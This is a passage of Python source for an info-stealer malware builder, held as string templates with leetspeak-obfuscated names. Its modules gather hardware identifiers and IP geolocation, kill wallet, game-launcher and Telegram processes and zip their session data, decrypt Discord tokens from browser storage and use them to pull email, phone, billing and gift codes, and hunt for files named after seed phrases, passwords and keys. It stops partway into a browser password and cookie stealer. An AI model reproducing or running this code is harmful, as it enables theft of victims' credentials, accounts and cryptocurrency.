 - Machine Id                : {v4r_Machine_Id}
 - Machine Guid              : {v4r_Machine_Guid}
 - Hw Profile Guid           : {v4r_Hw_Profile_Guid}
 - Nvidia System Id          : {v4r_Nvidia_System_Id}
 - Guid Serial Number        : {v4r_Guid_Serial_Number}
 - Uuid Serial Number        : {v4r_Uuid_Serial_Number}
 - Motherboard Serial Number : {v4r_Motherboard_Serial_Number}
 - Motherboard Product       : {v4r_Motherboard_Product_Serial_Number}
 - Motherboard Manufacturer  : {v4r_Motherboard_Manufacturer_Serial_Number}
 - Processor Serial Number   : {v4r_Processor_Serial_Number}
 - Bios Serial Number        : {v4r_Bios_Serial_Number}
 - Bios Release Date         : {v4r_Bios_Release_Date}
 - Bios Version              : {v4r_Bios_Version}
 - System Bios Version       : {v4r_System_Bios_Version}
 - System Version            : {v4r_System_Version}
 - System Family             : {v4r_System_Family_Serial_Number}
 - System Manufacturer       : {v4r_System_Manufacturer_Serial_Number}
 - System Product            : {v4r_System_Product_Serial_Number}
 - System SKU                : {v4r_System_SKU_Serial_Number}
 - Oem String Serial Number  : {v4r_OemString_Serial_Number}
 - Asset Tag Serial Number   : {v4r_Asset_Tag}

Ip:
 - Public : {v4r_ip_address_public}
 - Local  : {v4r_ip_adress_local}

Ip Information:
 - Isp : {v4r_isp}
 - Org : {v4r_org}
 - As  : {v4r_as_number}

Ip Location:
 - Country   : {v4r_country} ({v4r_country_code})
 - Region    : {v4r_region} ({v4r_region_code})
 - Zip       : {v4r_zip_postal}
 - City      : {v4r_city}
 - Timezone  : {v4r_timezone}
 - Longitude : {v4r_longitude}
 - Latitude  : {v4r_latitude}
"""
    v4r_zip_file.writestr("System Info.txt", v4r_file_system_info)

    return v4r_status_system_info
'''
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

S3ssi0nFil3s = r'''
def D3f_S3ssi0nFil3s(v4r_zip_file):
    import os
    import psutil

    v4r_session_files_choice = ["%SESSION_FILES_CHOICE%"]
    v4r_name_wallets         = [] if "Wallets" in v4r_session_files_choice else None
    v4r_name_game_launchers  = [] if "Game Launchers" in v4r_session_files_choice else None
    v4r_name_apps            = [] if "Apps" in v4r_session_files_choice else None

    v4r_session_files = [
        ("Zcash",             os.path.join(v4r_path_appdata_roaming,   "Zcash"),                                                      "zcash.exe",             "Wallets"),
        ("Armory",            os.path.join(v4r_path_appdata_roaming,   "Armory"),                                                     "armory.exe",            "Wallets"),
        ("Bytecoin",          os.path.join(v4r_path_appdata_roaming,   "bytecoin"),                                                   "bytecoin.exe",          "Wallets"),
        ("Guarda",            os.path.join(v4r_path_appdata_roaming,   "Guarda", "Local Storage", "leveldb"),                         "guarda.exe",            "Wallets"),
        ("Atomic Wallet",     os.path.join(v4r_path_appdata_roaming,   "atomic", "Local Storage", "leveldb"),                         "atomic.exe",            "Wallets"),
        ("Exodus",            os.path.join(v4r_path_appdata_roaming,   "Exodus", "exodus.wallet"),                                    "exodus.exe",            "Wallets"),
        ("Binance",           os.path.join(v4r_path_appdata_roaming,   "Binance", "Local Storage", "leveldb"),                        "binance.exe",           "Wallets"),
        ("Jaxx Liberty",      os.path.join(v4r_path_appdata_roaming,   "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb"), "jaxx.exe",              "Wallets"),
        ("Electrum",          os.path.join(v4r_path_appdata_roaming,   "Electrum", "wallets"),                                        "electrum.exe",          "Wallets"),
        ("Coinomi",           os.path.join(v4r_path_appdata_roaming,   "Coinomi", "Coinomi", "wallets"),                              "coinomi.exe",           "Wallets"),
        ("Trust Wallet",      os.path.join(v4r_path_appdata_roaming,   "Trust Wallet"),                                               "trustwallet.exe",       "Wallets"),
        ("AtomicDEX",         os.path.join(v4r_path_appdata_roaming,   "AtomicDEX"),                                                  "atomicdex.exe",         "Wallets"),
        ("Wasabi Wallet",     os.path.join(v4r_path_appdata_roaming,   "WalletWasabi", "Wallets"),                                    "wasabi.exe",            "Wallets"),
        ("Ledger Live",       os.path.join(v4r_path_appdata_roaming,   "Ledger Live"),                                                "ledgerlive.exe",        "Wallets"),
        ("Trezor Suite",      os.path.join(v4r_path_appdata_roaming,   "Trezor", "suite"),                                            "trezor.exe",            "Wallets"),
        ("Blockchain Wallet", os.path.join(v4r_path_appdata_roaming,   "Blockchain", "Wallet"),                                       "blockchain.exe",        "Wallets"),
        ("Mycelium",          os.path.join(v4r_path_appdata_roaming,   "Mycelium", "Wallets"),                                        "mycelium.exe",          "Wallets"),
        ("Crypto.com",        os.path.join(v4r_path_appdata_roaming,   "Crypto.com", "appdata"),                                      "crypto.com.exe",        "Wallets"),
        ("BRD",               os.path.join(v4r_path_appdata_roaming,   "BRD", "wallets"),                                             "brd.exe",               "Wallets"),
        ("Coinbase Wallet",   os.path.join(v4r_path_appdata_roaming,   "Coinbase", "Wallet"),                                         "coinbase.exe",          "Wallets"),
        ("Zerion",            os.path.join(v4r_path_appdata_roaming,   "Zerion", "wallets"),                                          "zerion.exe",            "Wallets"),
        ("Steam",             os.path.join(v4r_path_program_files_x86, "Steam", "config"),                                            "steam.exe",             "Game Launchers"),
        ("Riot Games",        os.path.join(v4r_path_appdata_local,     "Riot Games", "Riot Client", "Data"),                          "riot.exe",              "Game Launchers"),
        ("Epic Games",        os.path.join(v4r_path_appdata_local,     "EpicGamesLauncher"),                                          "epicgameslauncher.exe", "Game Launchers"),
        ("Rockstar Games",    os.path.join(v4r_path_appdata_local,     "Rockstar Games"),                                             "rockstarlauncher.exe",  "Game Launchers"),
        ("Telegram",          os.path.join(v4r_path_appdata_roaming,   "Telegram Desktop", "tdata"),                                  "telegram.exe",          "Apps")
    ]

    try:
        for v4r_name, v4r_path, v4r_proc_name, v4r_type in v4r_session_files:
            if v4r_type in v4r_session_files_choice:
                for v4r_proc in psutil.process_iter(['pid', 'name']):
                    try:
                        if v4r_proc.info['name'].lower() == v4r_proc_name.lower():
                            v4r_proc.terminate()
                    except:
                        pass
    except:
        pass

    for v4r_name, v4r_path, v4r_proc_name, v4r_type in v4r_session_files:
        if v4r_type in v4r_session_files_choice and os.path.exists(v4r_path):
            try:
                if v4r_type == "Wallets" and v4r_name_wallets is not None:
                    v4r_name_wallets.append(v4r_name)
                elif v4r_type == "Game Launchers" and v4r_name_game_launchers is not None:
                    v4r_name_game_launchers.append(v4r_name)
                elif v4r_type == "Apps" and v4r_name_apps is not None:
                    v4r_name_apps.append(v4r_name)

                v4r_zip_file.writestr(os.path.join("Session Files", v4r_name, "path.txt"), v4r_path)

                if os.path.isdir(v4r_path):
                    for v4r_root, _, v4r_files in os.walk(v4r_path):
                        for v4r_file in v4r_files:
                            v4r_abs_file_path = os.path.join(v4r_root, v4r_file)
                            v4r_rel_path_in_zip = os.path.join(
                                "Session Files", v4r_name, "Files",
                                os.path.relpath(v4r_abs_file_path, v4r_path)
                            )
                            try:
                                v4r_zip_file.write(v4r_abs_file_path, v4r_rel_path_in_zip)
                            except:
                                pass
                else:
                    v4r_rel_path_in_zip = os.path.join("Session Files", v4r_name, "Files", os.path.basename(v4r_path))
                    try:
                        v4r_zip_file.write(v4r_path, v4r_rel_path_in_zip)
                    except:
                        pass
            except:
                pass

    if "Wallets" in v4r_session_files_choice:
        v4r_name_wallets = ", ".join(v4r_name_wallets) if v4r_name_wallets else "No"
    if "Game Launchers" in v4r_session_files_choice:
        v4r_name_game_launchers = ", ".join(v4r_name_game_launchers) if v4r_name_game_launchers else "No"
    if "Apps" in v4r_session_files_choice:
        v4r_name_apps = ", ".join(v4r_name_apps) if v4r_name_apps else "No"

    return v4r_name_wallets, v4r_name_game_launchers, v4r_name_apps
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Di5c0rdAccount = r'''
def D3f_Di5c0rdAccount(v4r_zip_file):
    import os
    import re
    import json
    import base64
    import requests
    import psutil
    from Cryptodome.Cipher import AES
    from win32crypt import CryptUnprotectData

    v4r_file_discord_account = ""
    v4r_number_discord_account = 0

    def D3f_Extr4ctT0k3n5():  
        v4r_base_url = "https://discord.com/api/v9/users/@me"
        v4r_regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        v4r_regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
        v4r_t0k3n5 = []
        v4r_uids = []
        v4r_token_info = {}

        v4r_paths = [
            ("Discord",                os.path.join(v4r_path_appdata_roaming, "discord", "Local Storage", "leveldb"),                                                  ""),
            ("Discord Canary",         os.path.join(v4r_path_appdata_roaming, "discordcanary", "Local Storage", "leveldb"),                                            ""),
            ("Lightcord",              os.path.join(v4r_path_appdata_roaming, "Lightcord", "Local Storage", "leveldb"),                                                ""),
            ("Discord PTB",            os.path.join(v4r_path_appdata_roaming, "discordptb", "Local Storage", "leveldb"),                                               ""),
            ("Opera",                  os.path.join(v4r_path_appdata_roaming, "Opera Software", "Opera Stable", "Local Storage", "leveldb"),                           "opera.exe"),
            ("Opera GX",               os.path.join(v4r_path_appdata_roaming, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb"),                        "opera.exe"),
            ("Opera Neon",             os.path.join(v4r_path_appdata_roaming, "Opera Software", "Opera Neon", "Local Storage", "leveldb"),                             "opera.exe"),
            ("Amigo",                  os.path.join(v4r_path_appdata_local,   "Amigo", "User Data", "Local Storage", "leveldb"),                                       "amigo.exe"),
            ("Torch",                  os.path.join(v4r_path_appdata_local,   "Torch", "User Data", "Local Storage", "leveldb"),                                       "torch.exe"),
            ("Kometa",                 os.path.join(v4r_path_appdata_local,   "Kometa", "User Data", "Local Storage", "leveldb"),                                      "kometa.exe"),
            ("Orbitum",                os.path.join(v4r_path_appdata_local,   "Orbitum", "User Data", "Local Storage", "leveldb"),                                     "orbitum.exe"),
            ("CentBrowser",            os.path.join(v4r_path_appdata_local,   "CentBrowser", "User Data", "Local Storage", "leveldb"),                                 "centbrowser.exe"),
            ("7Star",                  os.path.join(v4r_path_appdata_local,   "7Star", "7Star", "User Data", "Local Storage", "leveldb"),                              "7star.exe"),
            ("Sputnik",                os.path.join(v4r_path_appdata_local,   "Sputnik", "Sputnik", "User Data", "Local Storage", "leveldb"),                          "sputnik.exe"),
            ("Vivaldi",                os.path.join(v4r_path_appdata_local,   "Vivaldi", "User Data", "Default", "Local Storage", "leveldb"),                          "vivaldi.exe"),
            ("Google Chrome",          os.path.join(v4r_path_appdata_local,   "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),                 "chrome.exe"),
            ("Google Chrome",          os.path.join(v4r_path_appdata_local,   "Google", "Chrome", "User Data", "Profile 1", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(v4r_path_appdata_local,   "Google", "Chrome", "User Data", "Profile 2", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(v4r_path_appdata_local,   "Google", "Chrome", "User Data", "Profile 3", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(v4r_path_appdata_local,   "Google", "Chrome", "User Data", "Profile 4", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(v4r_path_appdata_local,   "Google", "Chrome", "User Data", "Profile 5", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome SxS",      os.path.join(v4r_path_appdata_local,   "Google", "Chrome SxS", "User Data", "Default", "Local Storage", "leveldb"),             "chrome.exe"),
            ("Google Chrome Beta",     os.path.join(v4r_path_appdata_local,   "Google", "Chrome Beta", "User Data", "Default", "Local Storage", "leveldb"),            "chrome.exe"),
            ("Google Chrome Dev",      os.path.join(v4r_path_appdata_local,   "Google", "Chrome Dev", "User Data", "Default", "Local Storage", "leveldb"),             "chrome.exe"),
            ("Google Chrome Unstable", os.path.join(v4r_path_appdata_local,   "Google", "Chrome Unstable", "User Data", "Default", "Local Storage", "leveldb"),        "chrome.exe"),
            ("Google Chrome Canary",   os.path.join(v4r_path_appdata_local,   "Google", "Chrome Canary", "User Data", "Default", "Local Storage", "leveldb"),          "chrome.exe"),
            ("Epic Privacy Browser",   os.path.join(v4r_path_appdata_local,   "Epic Privacy Browser", "User Data", "Local Storage", "leveldb"),                        "epic.exe"),
            ("Microsoft Edge",         os.path.join(v4r_path_appdata_local,   "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),                "msedge.exe"),
            ("Uran",                   os.path.join(v4r_path_appdata_local,   "uCozMedia", "Uran", "User Data", "Default", "Local Storage", "leveldb"),                "uran.exe"),
            ("Yandex",                 os.path.join(v4r_path_appdata_local,   "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb"),          "yandex.exe"),
            ("Yandex Canary",          os.path.join(v4r_path_appdata_local,   "Yandex", "YandexBrowserCanary", "User Data", "Default", "Local Storage", "leveldb"),    "yandex.exe"),
            ("Yandex Developer",       os.path.join(v4r_path_appdata_local,   "Yandex", "YandexBrowserDeveloper", "User Data", "Default", "Local Storage", "leveldb"), "yandex.exe"),
            ("Yandex Beta",            os.path.join(v4r_path_appdata_local,   "Yandex", "YandexBrowserBeta", "User Data", "Default", "Local Storage", "leveldb"),      "yandex.exe"),
            ("Yandex Tech",            os.path.join(v4r_path_appdata_local,   "Yandex", "YandexBrowserTech", "User Data", "Default", "Local Storage", "leveldb"),      "yandex.exe"),
            ("Yandex SxS",             os.path.join(v4r_path_appdata_local,   "Yandex", "YandexBrowserSxS", "User Data", "Default", "Local Storage", "leveldb"),       "yandex.exe"),
            ("Brave",                  os.path.join(v4r_path_appdata_local,   "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),   "brave.exe"),
            ("Iridium",                os.path.join(v4r_path_appdata_local,   "Iridium", "User Data", "Default", "Local Storage", "leveldb"),                          "iridium.exe"),
        ]

        
        try:
             for v4r_name, v4r_path, v4r_proc_name in v4r_paths:
                for v4r_proc in psutil.process_iter(['pid', 'name']):
                    try:
                        if v4r_proc.name().lower() == v4r_proc_name.lower():
                            v4r_proc.terminate()
                    except: pass
        except: pass

        for v4r_name, v4r_path, v4r_proc_name in v4r_paths:
            if not os.path.exists(v4r_path):

                continue
            v4r__d15c0rd = v4r_name.replace(" ", "").lower()
            if "cord" in v4r_path:
                if not os.path.exists(os.path.join(v4r_path_appdata_roaming, v4r__d15c0rd, 'Local State')):
                    continue
                for v4r_file_name in os.listdir(v4r_path):
                    if v4r_file_name[-3:] not in ["log", "ldb"]:
                        continue
                    v4r_total_path = os.path.join(v4r_path, v4r_file_name)
                    if os.path.exists(v4r_total_path):
                        with open(v4r_total_path, errors='ignore') as v4r_file:
                            for v4r_line in v4r_file:
                                for y in re.findall(v4r_regexp_enc, v4r_line.strip()):
                                    v4r_t0k3n = D3f_DecryptVal(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), D3f_GetMasterKey(os.path.join(v4r_path_appdata_roaming, v4r__d15c0rd, 'Local State')))
                                    if D3f_ValidateT0k3n(v4r_t0k3n, v4r_base_url):
                                        v4r_uid = requests.get(v4r_base_url, headers={'Authorization': v4r_t0k3n}).json()['id']
                                        if v4r_uid not in v4r_uids:
                                            v4r_t0k3n5.append(v4r_t0k3n)
                                            v4r_uids.append(v4r_uid)
                                            v4r_token_info[v4r_t0k3n] = (v4r_name, v4r_total_path)
            else:
                for v4r_file_name in os.listdir(v4r_path):
                    if v4r_file_name[-3:] not in ["log", "ldb"]:
                        continue
                    v4r_total_path = os.path.join(v4r_path, v4r_file_name)
                    if os.path.exists(v4r_total_path):
                        with open(v4r_total_path, errors='ignore') as v4r_file:
                            for v4r_line in v4r_file:
                                for v4r_t0k3n in re.findall(v4r_regexp, v4r_line.strip()):
                                    if D3f_ValidateT0k3n(v4r_t0k3n, v4r_base_url):
                                        v4r_uid = requests.get(v4r_base_url, headers={'Authorization': v4r_t0k3n}).json()['id']
                                        if v4r_uid not in v4r_uids:
                                            v4r_t0k3n5.append(v4r_t0k3n)
                                            v4r_uids.append(v4r_uid)
                                            v4r_token_info[v4r_t0k3n] = (v4r_name, v4r_total_path)

        if os.path.exists(os.path.join(v4r_path_appdata_roaming, "Mozilla", "Firefox", "Profiles")):
            for v4r_path, _, v4r_files in os.walk(os.path.join(v4r_path_appdata_roaming, "Mozilla", "Firefox", "Profiles")):
                for v4r__file in v4r_files:
                    if v4r__file.endswith('.sqlite'):
                        with open(os.path.join(v4r_path, v4r__file), errors='ignore') as v4r_file:
                            for v4r_line in v4r_file:
                                for v4r_t0k3n in re.findall(v4r_regexp, v4r_line.strip()):
                                    if D3f_ValidateT0k3n(v4r_t0k3n, v4r_base_url):
                                        v4r_uid = requests.get(v4r_base_url, headers={'Authorization': v4r_t0k3n}).json()['id']
                                        if v4r_uid not in v4r_uids:
                                            v4r_t0k3n5.append(v4r_t0k3n)
                                            v4r_uids.append(v4r_uid)
                                            v4r_token_info[v4r_t0k3n] = ('Firefox', os.path.join(v4r_path, v4r__file))
        return v4r_t0k3n5, v4r_token_info

    def D3f_ValidateT0k3n(v4r_t0k3n, v4r_base_url):
        return requests.get(v4r_base_url, headers={'Authorization': v4r_t0k3n}).status_code == 200

    def D3f_DecryptVal(v4r_buff, v4r_master_key):
        v4r_iv = v4r_buff[3:15]
        v4r_payload = v4r_buff[15:]
        v4r_cipher = AES.new(v4r_master_key, AES.MODE_GCM, v4r_iv)
        return v4r_cipher.decrypt(v4r_payload)[:-16].decode()

    def D3f_GetMasterKey(v4r_path):
        if not os.path.exists(v4r_path):
            return None
        with open(v4r_path, "r", encoding="utf-8") as v4r_f:
            v4r_local_state = json.load(v4r_f)
        v4r_master_key = base64.b64decode(v4r_local_state["os_crypt"]["encrypted_key"])[5:]
        return CryptUnprotectData(v4r_master_key, None, None, None, 0)[1]

    v4r_t0k3n5, v4r_token_info = D3f_Extr4ctT0k3n5()
    
    if not v4r_t0k3n5:
        v4r_file_discord_account = "No discord tokens found."

    for v4r_t0k3n_d15c0rd in v4r_t0k3n5:
        v4r_number_discord_account += 1

        try: v4r_api = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': v4r_t0k3n_d15c0rd}).json()
        except: v4r_api = {"None": "None"}

        v4r_u53rn4m3_d15c0rd = v4r_api.get('username', "None") + '#' + v4r_api.get('discriminator', "None")
        v4r_d15pl4y_n4m3_d15c0rd = v4r_api.get('global_name', "None")
        v4r_us3r_1d_d15c0rd = v4r_api.get('id', "None")
        v4r_em4i1_d15c0rd = v4r_api.get('email', "None")
        v4r_em4il_v3rifi3d_d15c0rd = v4r_api.get('verified', "None")
        v4r_ph0n3_d15c0rd = v4r_api.get('phone', "None")
        v4r_c0untry_d15c0rd = v4r_api.get('locale', "None")
        v4r_mf4_d15c0rd = v4r_api.get('mfa_enabled', "None")

        try:
            if v4r_api.get('premium_type', 'None') == 0:
                v4r_n1tr0_d15c0rd = 'False'
            elif v4r_api.get('premium_type', 'None') == 1:
                v4r_n1tr0_d15c0rd = 'Nitro Classic'
            elif v4r_api.get('premium_type', 'None') == 2:
                v4r_n1tr0_d15c0rd = 'Nitro Boosts'
            elif v4r_api.get('premium_type', 'None') == 3:
                v4r_n1tr0_d15c0rd = 'Nitro Basic'
            else:
                v4r_n1tr0_d15c0rd = 'False'
        except:
            v4r_n1tr0_d15c0rd = "None"

        try: v4r_av4t4r_ur1_d15c0rd = f"https://cdn.discordapp.com/avatars/{v4r_us3r_1d_d15c0rd}/{v4r_api['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{v4r_us3r_1d_d15c0rd}/{v4r_api['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{v4r_us3r_1d_d15c0rd}/{v4r_api['avatar']}.png"
        except: v4r_av4t4r_ur1_d15c0rd = "None"

        try:
            v4r_billing_discord = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': v4r_t0k3n_d15c0rd}).json()
            if v4r_billing_discord:
                v4r_p4ym3nt_m3th0d5_d15c0rd = []

                for v4r_method in v4r_billing_discord:
                    if v4r_method['type'] == 1:
                        v4r_p4ym3nt_m3th0d5_d15c0rd.append('Bank Card')
                    elif v4r_method['type'] == 2:
                        v4r_p4ym3nt_m3th0d5_d15c0rd.append("Paypal")
                    else:
                        v4r_p4ym3nt_m3th0d5_d15c0rd.append('Other')
                v4r_p4ym3nt_m3th0d5_d15c0rd = ' / '.join(v4r_p4ym3nt_m3th0d5_d15c0rd)
            else:
                v4r_p4ym3nt_m3th0d5_d15c0rd = "None"
        except:
            v4r_p4ym3nt_m3th0d5_d15c0rd = "None"

        try:
            v4r_gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': v4r_t0k3n_d15c0rd}).json()
            if v4r_gift_codes:
                v4r_codes = []
                for v4r_g1ft_c0d35_d15c0rd in v4r_gift_codes:
                    v4r_name = v4r_g1ft_c0d35_d15c0rd['promotion']['outbound_title']
                    v4r_g1ft_c0d35_d15c0rd = v4r_g1ft_c0d35_d15c0rd['code']
                    v4r_data = f"Gift: \"{v4r_name}\" Code: \"{v4r_g1ft_c0d35_d15c0rd}\""
                    if len('\n\n'.join(v4r_g1ft_c0d35_d15c0rd)) + len(v4r_data) >= 1024:
                        break
                    v4r_codes.append(v4r_data)
                if len(v4r_codes) > 0:
                    v4r_g1ft_c0d35_d15c0rd = '\n\n'.join(v4r_codes)
                else:
                    v4r_g1ft_c0d35_d15c0rd = "None"
            else:
                v4r_g1ft_c0d35_d15c0rd = "None"
        except:
            v4r_g1ft_c0d35_d15c0rd = "None"
    
        try: v4r_software_name, v4r_path = v4r_token_info.get(v4r_t0k3n_d15c0rd, ("Unknown", "Unknown"))
        except: v4r_software_name, v4r_path = "Unknown", "Unknown"

        v4r_file_discord_account = v4r_file_discord_account + f"""
Discord Account n°{str(v4r_number_discord_account)}:
 - Path Found      : {v4r_path}
 - Software        : {v4r_software_name}
 - Token           : {v4r_t0k3n_d15c0rd}
 - Username        : {v4r_u53rn4m3_d15c0rd}
 - Display Name    : {v4r_d15pl4y_n4m3_d15c0rd}
 - Id              : {v4r_us3r_1d_d15c0rd}
 - Email           : {v4r_em4i1_d15c0rd}
 - Email Verified  : {v4r_em4il_v3rifi3d_d15c0rd}
 - Phone           : {v4r_ph0n3_d15c0rd}
 - Nitro           : {v4r_n1tr0_d15c0rd}
 - Language        : {v4r_c0untry_d15c0rd}
 - Billing         : {v4r_p4ym3nt_m3th0d5_d15c0rd}
 - Gift Code       : {v4r_g1ft_c0d35_d15c0rd}
 - Profile Picture : {v4r_av4t4r_ur1_d15c0rd}
 - Multi-Factor Authentication : {v4r_mf4_d15c0rd}
"""
    v4r_zip_file.writestr(f"Discord Accounts ({v4r_number_discord_account}).txt", v4r_file_discord_account)

    return v4r_number_discord_account
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Int3r3stingFil3s = r'''
def D3f_Int3r3stingFil3s(v4r_zip_file):
    import os
    import random

    v4r_paths = [
        os.path.join(v4r_path_userprofile, "Desktop"),
        os.path.join(v4r_path_userprofile, "Downloads"),
        os.path.join(v4r_path_userprofile, "Documents"),
        os.path.join(v4r_path_userprofile, "Picture"),
        os.path.join(v4r_path_userprofile, "Video"),
        os.path.join(v4r_path_userprofile, "OneDrive"),
        os.path.join(v4r_path_appdata_roaming, "Microsoft", "Windows", "Recent")
    ]

    v4r_keywords = [
        "2fa", "mfa", "2step", "otp", "verification", "verif",
        "acount", "account", "compte", "identifiant", "login",
        "personnel", "personal", "perso",
        "banque", "bank", "funds", "fonds", "paypal", "casino",
        "crypto", "cryptomonnaie", "bitcoin", "btc", "eth", "ethereum", "atomic", "exodus", "binance", "metamask", "trading", "échange", "exchange", "wallet", "portefeuille", "ledger", "trezor", "seed", "seed phrase", "phrase de récupération", "recovery", "récupération", "recovery phrase", "phrase de récupération", "mnemonic", "mnémonique","passphrase", "phrase secrète", "wallet key", "clé de portefeuille", "mywallet", "backupwallet", "wallet backup", "sauvegarde de portefeuille", "private key", "clé privée", "keystore", "trousseau", "json", "trustwallet", "safepal", "coinbase", "kucoin", "kraken", "blockchain", "bnb", "usdt",
        "telegram", "disc", "discord", "token", "tkn", "webhook", "api", "bot", "tokendisc",
        "key", "clé", "cle", "keys", "private", "prive", "privé", "secret", "steal", "voler", "access", "auth",
        "mdp", "motdepasse", "mot_de_passe", "password", "psw", "pass", "passphrase", "phrase", "pwd", "passwords",
        "data", "donnée", "donnee", "donnees", "details",
        "confidential", "confidentiel", "sensitive", "sensible", "important", "privilege", "privilège"
        "vault", "safe", "locker", "protection", "hidden", "caché", "cache",
        "identity", "identité", "passport", "passeport", "permis",
        "pin", "nip",
        "leak", "dump", "exposed", "hack", "crack", "pirate", "piratage", "breach", "faille",
        "master", "admin", "administrator", "administrateur", "root", "owner", "propriétaire", "proprietaire",
        "keyfile", "keystore", "seedphrase", "recoveryphrase", "privatekey", "publickey",
        "accountdata", "userdata", "logininfo", "seedbackup",
    ]

    v4r_name_files = []

    for v4r_path in v4r_paths:
        for v4r_root, v4r_dirs, v4r_files in os.walk(v4r_path):
            for v4r_file in v4r_files:
                try:
                    if v4r_file.lower().endswith(('.txt', '.sql', '.zip')):
                        v4r_file_name_no_ext = os.path.splitext(v4r_file)[0].lower()
                        for v4r_keyword in v4r_keywords:
                            try:
                                if v4r_keyword.lower() == v4r_file_name_no_ext:
                                    v4r_full_path = os.path.join(v4r_root, v4r_file)
                                    if os.path.exists(v4r_full_path):
                                        v4r_name_files.append(v4r_file)
                                        v4r_base_name, v4r_ext = os.path.splitext(v4r_file)
                                        with open(v4r_full_path, "rb") as v4r_f:
                                            v4r_zip_file.writestr(os.path.join("Interesting Files", v4r_base_name + f"_{random.randint(1, 9999)}" + v4r_ext), v4r_f.read())
                                    break
                            except: pass
                except: pass

    if v4r_name_files:
        v4r_number_files = sum(len(phrase.split()) for phrase in v4r_name_files)
    else:
        v4r_number_files = 0

    return v4r_number_files
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Br0w53r5t341 = r'''
def D3f_Br0w53r5t341(v4r_zip_file):
    import os
    import psutil
    import json
    import base64
    import sqlite3
    import win32crypt
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

    global v4r_number_extentions, v4r_number_passwords, v4r_number_cookies, v4r_number_history, v4r_number_downloads, v4r_number_cards

    v4r_browser_choice = ["%BROWSER_CHOICE%"]
    v4r_browsers = []

    if "extentions" in v4r_browser_choice:
        v4r_number_extentions = 0
    else:
        v4r_number_extentions = None

    if "passwords" in v4r_browser_choice:
        v4r_file_passwords = []
        v4r_number_passwords = 0
    else:
        v4r_file_passwords = ""
        v4r_number_passwords = None
    if "cookies" in v4r_browser_choice:
        v4r_file_cookies = []
        v4r_number_cookies = 0
    else:
        v4r_file_cookies = ""
        v4r_number_cookies = None
    if "history" in v4r_browser_choice:
        v4r_file_history = []
        v4r_number_history = 0
    else:
        v4r_file_history = ""
        v4r_number_history = None
    if "downloads" in v4r_browser_choice:
        v4r_file_downloads = []
        v4r_number_downloads = 0
    else:
        v4r_file_downloads = ""
        v4r_number_downloads = None
    if "cards" in v4r_browser_choice:
        v4r_file_cards = []
        v4r_number_cards = 0
    else:
        v4r_file_cards = ""
        v4r_number_cards = None
    
    def D3f_GetMasterKey(v4r_path):
        if not os.path.exists(v4r_path):
            return None

        try:
            with open(v4r_path, 'r', encoding='utf-8') as v4r_f:
                v4r_local_state = json.load(v4r_f)

            v4r_encrypted_key = base64.b64decode(v4r_local_state["os_crypt"]["encrypted_key"])[5:]
            v4r_master_key = win32crypt.CryptUnprotectData(v4r_encrypted_key, None, None, None, 0)[1]
            return v4r_master_key
        except:
            return None

    def D3f_Decrypt(v4r_buff, v4r_master_key):
        try:
            v4r_iv = v4r_buff[3:15]
            v4r_payload = v4r_buff[15:-16]
            v4r_tag = v4r_buff[-16:]
            v4r_cipher = Cipher(algorithms.AES(v4r_master_key), modes.GCM(v4r_iv, v4r_tag))
